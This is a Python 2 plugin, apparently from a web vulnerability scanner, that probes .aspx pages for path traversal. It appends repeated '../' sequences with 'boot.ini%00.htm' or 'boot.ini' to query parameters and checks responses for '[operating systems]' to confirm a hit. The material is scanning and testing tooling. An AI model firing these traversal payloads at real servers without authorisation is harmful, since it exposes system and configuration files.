#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
import MySQLdb
import httplib2
import urlparse
import re
def run_url(http,ob,item):
    try:
        
        result=[]
        url=item['url']
        #print url
        
        detail=u''
        detail=detail.encode('utf8')
        parse=urlparse.urlparse(url)
        path=parse.path
        if path.lower().find(".aspx")<0:
            return result
        #print "path:"+path
        if path=="" or path=="/":
            return result
        #print "item['params':"+item['params']
        if item['params'] == "":
            
            return result
        #end if
        if item['method'] == 'get':
            query=""
            response1,content1=requestUrl(http,item['url']+"?"+item['params'],ob['task_id'],ob['domain_id'])
            if item['params'].find("&")>=0:
                params= item['params'].split("&")
                for i in range(0,len(params)):
                    query=""
                    for j in range(1,len(params)+1):
                        query=params[len(params)-i-j]+"&"+query
                        #print "----++++----"
                        #print query
                        #print "----++++----"
                    key=query[0:query.rfind("=")]  
                    #print key
                    geturl = "%s?%s" % (item['url'],key)
                    #print geturl
                    
            else:
                geturl=item['url']+"?"+item['params']
                if geturl.find("=")>=0:
                    geturl=geturl.split("=")[0]
                else:
                    return result
                
                
            explfi=''
                
            for i in range(15):
                
                        
                     
                gettrueurl="%s=%sboot.ini%%00.htm"%(geturl,explfi)
                
                response,content=requestUrl(http,gettrueurl,ob['task_id'],ob['domain_id'])
                if content.find("[operating systems]")>=0 and content1.find("[operating systems]")<0 and response['status']!="404":
                    
                    request=getRequest(gettrueurl,'GET')
                    response=getResponse(response,"")
#                    result.append(getRecord(ob,url,ob['level'],detail,request,response))
                    if ob['isstart']=='1':
                        
                                            
                        detail="验证性扫描结果：\n%s\n%s"%("[operating systems]",detail)
                    result.append(getRecord(ob,url,ob['level'],detail,request,response))
                                        
                    break
                else:
                    explfi="%s../"%(explfi)
            explfi=''
            if len(result)==0:
                
                for i in range(15):
                    
                
                        
                     
                    gettrueurl="%s=%sboot.ini"%(geturl,explfi)
                    
                    response,content=requestUrl(http,gettrueurl,ob['task_id'],ob['domain_id'])
                    if content.find("[operating systems]")>=0 and content1.find("[operating systems]")<0 and response['status']!="404":
                        
                        request=getRequest(gettrueurl,'GET')
                        response=getResponse(response,"")
#                        result.append(getRecord(ob,url,ob['level'],detail,request,response))
                        if ob['isstart']=='1':
                            
                            detail="验证性扫描结果：\n%s\n%s"%(content,detail)
                        result.append(getRecord(ob,url,ob['level'],detail,request,response))
                                            
                        break
                    else:
                        explfi="%s../"%(explfi)
#                                        
    except Exception,e:
        logging.getLogger().error("File:systemfilereadscript.py, run_url function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:systemfilereadscript.py, run_url function :" + str(e))
    #end try
    return result                    
                
                 
     
            
            
   
    